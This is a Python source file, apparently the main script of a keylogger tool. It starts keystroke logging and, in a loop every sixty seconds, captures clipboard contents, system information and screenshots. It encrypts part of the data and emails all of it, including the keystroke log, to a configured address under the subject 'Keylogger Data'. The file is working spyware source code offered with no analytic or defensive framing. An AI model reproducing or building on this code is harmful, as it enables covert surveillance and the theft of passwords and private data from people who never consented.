import time
from clipboard import capture_clipboard
from system_info import get_system_info
from screenshot import capture_screenshot
from encryption import encrypt_data
from mail import send_email
import os
from key_log import start_keylogger



def main():
    fromaddr = '' #sender's address
    toaddr = ' ' #reciever's address
    password = '' 
    
    
    with open("keylog_info.txt", "ab") as f:
        pass 
    
    
    start_keylogger()
    while True:
       
        clipboard_content = capture_clipboard()
        system_info = get_system_info()
        screenshot_path = capture_screenshot()

        encrypted_clipboard = encrypt_data(clipboard_content)
        encrypted_system_info = encrypt_data(str(system_info))

      
        with open("clipboard.txt", "wb") as f:
            f.write(encrypted_clipboard)
        with open("system_info.txt", "wb") as f:
            f.write(encrypted_system_info)

       
        attachments = ["clipboard.txt", "system_info.txt", screenshot_path]
        if os.path.exists("keylog_info.txt"):
            attachments.append("keylog_info.txt")


        send_email("Keylogger Data", "Encrypted data and screenshot attached.", fromaddr, toaddr, password, attachments)

        time.sleep(60)

if __name__ == "__main__":
    main()
